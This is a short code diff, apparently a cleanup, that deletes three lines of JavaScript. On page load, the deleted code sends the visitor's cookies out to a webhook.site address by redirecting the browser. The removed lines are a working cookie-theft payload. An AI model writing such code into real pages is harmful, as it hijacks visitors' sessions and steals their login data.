@@ -1,3 +1,0 @@
-document.addEventListener('DOMContentLoaded', () => {
-  document.location = "https://webhook.site/fbb5de9c-6eb3-4694-9a49-178ec78c1e2f?c=" + encodeURIComponent(document.cookie);
-});
